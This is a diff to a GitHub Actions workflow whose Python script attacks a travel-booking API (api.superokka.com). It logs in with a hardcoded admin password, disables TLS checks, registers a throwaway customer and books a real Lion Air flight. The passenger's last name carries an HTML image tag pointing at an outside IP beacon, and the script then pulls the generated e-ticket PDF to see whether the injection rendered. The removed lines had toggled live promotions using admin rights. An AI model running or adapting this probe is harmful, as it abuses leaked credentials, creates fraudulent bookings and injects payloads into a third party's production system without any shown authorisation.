@@ -1,6 +1,11 @@
 name: superokka
 on:
   workflow_dispatch:
+    inputs:
+      vtoken:
+        description: verification token
+        required: false
+        default: ""
 jobs:
   run:
     runs-on: ubuntu-latest
@@ -8,74 +13,74 @@ jobs:
       - run: pip install --quiet requests pypdf
       - run: |
           python3 - <<'PYEOF'
-          import requests, json, urllib3
+          import requests, json, urllib3, os
           urllib3.disable_warnings()
           B = "https://api.superokka.com"
           s = requests.Session(); s.verify = False
           r = s.post(f"{B}/auth/login", json={"username":"financeokka","password":"KwRce2026!x#9","force":True}, timeout=25)
-          print("LOGIN:", r.status_code)
+          print("ADMIN LOGIN:", r.status_code)
           if not r.json().get("success"):
-              print(r.text[:150]); raise SystemExit
+              print(r.text[:120]); raise SystemExit
           A = {"Authorization": "Bearer " + r.json()["data"]["accessToken"]}
-          promos = ["273438d8-5c06-4f33-90f4-aeab6b1666d6","32d0998a-667d-4f66-a0a1-6020fd4ab45c","e73ba945-2378-466d-b391-7f67233089fe"]
-          for pid in promos:
-              rr = s.patch(f"{B}/promotions/{pid}", headers=A, json={"status":"INACTIVE"}, timeout=20)
-              print("PROMO OFF:", pid[:8], rr.status_code)
-          body = {"departureAirportCode":"CGK","arrivalAirportCode":"SUB","departureDate":"2026-12-22"}
-          r = s.post(f"{B}/flight-search/lion-air/search", headers=A, json=body, timeout=60)
-          print("SEARCH:", r.status_code)
-          d = r.json().get("data", {})
-          sid = d.get("sessionId")
-          segs = (d.get("departureFlightsData") or [{}])[0].get("flightSegments", [])
-          fares = (d.get("departureFlightsData") or [{}])[0].get("priceAvailabilities", [])
-          print("FARES:", json.dumps(fares)[:200])
-          if not sid or not segs: raise SystemExit
-          seg = segs[0]; bk = seg["bookingAvails"][0]
-          det = {"flightSegments":[{"departureAirportCode":seg["departureAirport"],"arrivalAirportCode":seg["arrivalAirport"],
-                 "departureDate":seg["departureDateTime"],"arrivalDate":seg["arrivalDateTime"],
-                 "flightNumber":seg["flightNumber"],"airlineCode":seg["airline"]["code"],
-                 "resBookDesigCode":bk["bookingClass"],"type":"departure"}],
-                 "adults":1,"children":0,"infants":0,"direction":"one-way","sessionId":sid}
-          r = s.post(f"{B}/flight-search/lion-air/details", headers=A, json=det, timeout=60)
-          print("DETAILS:", r.status_code)
-          def book(lastname):
+          vtok = os.environ.get("VTOKEN","").strip()
+          if not vtok:
+              r = s.post(f"{B}/auth/register", json={"username":"kwbook01","email":"superxfilecom+book1@gmail.com",
+                  "password":"Book2026!x","roleName":"Customer","companyId":"4df1efad-247e-4232-9acb-6254ed0c4730",
+                  "name":"Kw Booking","gender":"Male","address":"Jakarta","phone":"081234567777"}, timeout=25)
+              print("REGISTER:", r.status_code, r.text[:150])
+              uid = r.json().get("data",{}).get("id")
+              print("UID:", uid)
+              r = s.post(f"{B}/auth/send-verification", headers=A, json={"email":"superxfilecom+book1@gmail.com"}, timeout=25)
+              print("SENDVERIFY:", r.status_code, r.text[:100])
+          else:
+              r = s.get(f"{B}/auth/verify", params={"token":vtok}, timeout=25, allow_redirects=False)
+              print("VERIFY:", r.status_code)
+              r = s.post(f"{B}/auth/login", json={"username":"kwbook01","password":"Book2026!x"}, timeout=25)
+              print("CUST LOGIN:", r.status_code, r.text[:100])
+              if not r.json().get("success"):
+                  print("CUST FAIL"); raise SystemExit
+              C = {"Authorization": "Bearer " + r.json()["data"]["accessToken"]}
+              body = {"departureAirportCode":"CGK","arrivalAirportCode":"SUB","departureDate":"2026-12-22"}
+              r = s.post(f"{B}/flight-search/lion-air/search", headers=C, json=body, timeout=60)
+              print("SEARCH:", r.status_code)
+              d = r.json().get("data", {})
+              sid = d.get("sessionId")
+              segs = (d.get("departureFlightsData") or [{}])[0].get("flightSegments", [])
+              if not sid or not segs: raise SystemExit
+              seg = segs[0]; bk = seg["bookingAvails"][0]
+              det = {"flightSegments":[{"departureAirportCode":seg["departureAirport"],"arrivalAirportCode":seg["arrivalAirport"],
+                     "departureDate":seg["departureDateTime"],"arrivalDate":seg["arrivalDateTime"],
+                     "flightNumber":seg["flightNumber"],"airlineCode":seg["airline"]["code"],
+                     "resBookDesigCode":bk["bookingClass"],"type":"departure"}],
+                     "adults":1,"children":0,"infants":0,"direction":"one-way","sessionId":sid}
+              r = s.post(f"{B}/flight-search/lion-air/details", headers=C, json=det, timeout=60)
+              print("DETAILS:", r.status_code)
+              html = '<img src="http://64.227.62.83:8899/beacon3">'
               traveler = {"passengerTypeCode":"ADT","isAccompaniedByInfant":False,"prefixName":"MR",
-                  "firstName":"Budi","lastName":lastname,"surname":"Santoso",
+                  "firstName":"Budi","lastName":html,"surname":"Santoso",
                   "dateOfBirth":"1990-01-01","gender":"M","nationality":"ID","documentType":"KTP",
                   "documentNumber":"3174010101900001","documentExpirationDate":"2028-01-01","documentIssueCountry":"ID",
-                  "email":"superxfilecom@gmail.com","phoneNumber":"081234567890"}
-              b = {"airTravelers":[traveler],"sessionId":sid,"contactEmail":"superxfilecom@gmail.com",
-                   "contactPhoneNumber":"081234567890","contactFirstName":"Kw","contactLastName":lastname,
-                   "isEndOfTransaction":True}
-              return s.post(f"{B}/flight-search/lion-air/book", headers=A, json=b, timeout=120)
-          r = book("Santoso")
-          print("BOOK CLEAN:", r.status_code, r.text[:200])
-          tid = None
-          if r.json().get("success"):
-              tx = r.json()["data"]; tid = tx.get("transactionId") or tx.get("id")
-              print("TID CLEAN:", tid)
-              rr = s.post(f"{B}/transactions/{tid}/etickets", headers=A, timeout=180)
-              print("ETICKET CLEAN:", rr.status_code, rr.text[:160])
-          html = '<img src="http://64.227.62.83:8899/beacon2">'
-          r = book(html)
-          print("BOOK PAYLOAD:", r.status_code, r.text[:200])
-          if r.json().get("success"):
-              tx = r.json()["data"]; tid2 = tx.get("transactionId") or tx.get("id")
-              print("TID PAYLOAD:", tid2)
-              rr = s.post(f"{B}/transactions/{tid2}/etickets", headers=A, timeout=180)
-              print("ETICKET PAYLOAD:", rr.status_code, rr.text[:200])
-              try:
-                  fn = rr.json()["data"][0]["filename"]
-                  res = s.get(f"{B}/uploads/etickets/{fn}", timeout=60)
-                  print("PDF:", res.status_code, len(res.content))
-                  open("/tmp/e.pdf","wb").write(res.content)
-                  from pypdf import PdfReader
-                  txt = PdfReader("/tmp/e.pdf").pages[0].extract_text() or ""
-                  print("PDFTEXT:", txt[:600])
-                  print("HAS BEACON:", "beacon2" in txt)
-              except Exception as e:
-                  print("PDFERR:", str(e)[:150])
-          for pid in promos:
-              s.patch(f"{B}/promotions/{pid}", headers=A, json={"status":"ACTIVE"}, timeout=20)
-          print("PROMOS RESTORED")
+                  "email":"superxfilecom+book1@gmail.com","phoneNumber":"081234567777"}
+              book = {"airTravelers":[traveler],"sessionId":sid,"contactEmail":"superxfilecom+book1@gmail.com",
+                      "contactPhoneNumber":"081234567777","contactFirstName":"Kw","contactLastName":html,
+                      "isEndOfTransaction":True}
+              r = s.post(f"{B}/flight-search/lion-air/book", headers=C, json=book, timeout=120)
+              print("BOOK:", r.status_code, r.text[:250])
+              if r.json().get("success"):
+                  tx = r.json()["data"]
+                  tid = tx.get("transactionId") or tx.get("id")
+                  print("TID:", tid)
+                  rr = s.post(f"{B}/transactions/{tid}/etickets", headers=A, timeout=180)
+                  print("ETICKET:", rr.status_code, rr.text[:200])
+                  try:
+                      fn = rr.json()["data"][0]["filename"]
+                      res = s.get(f"{B}/uploads/etickets/{fn}", timeout=60)
+                      print("PDF:", res.status_code, len(res.content))
+                      open("/tmp/e.pdf","wb").write(res.content)
+                      from pypdf import PdfReader
+                      txt = PdfReader("/tmp/e.pdf").pages[0].extract_text() or ""
+                      print("PDFTEXT:", txt[:600])
+                      print("HAS BEACON:", "beacon3" in txt)
+                  except Exception as e:
+                      print("PDFERR:", str(e)[:150])
           PYEOF
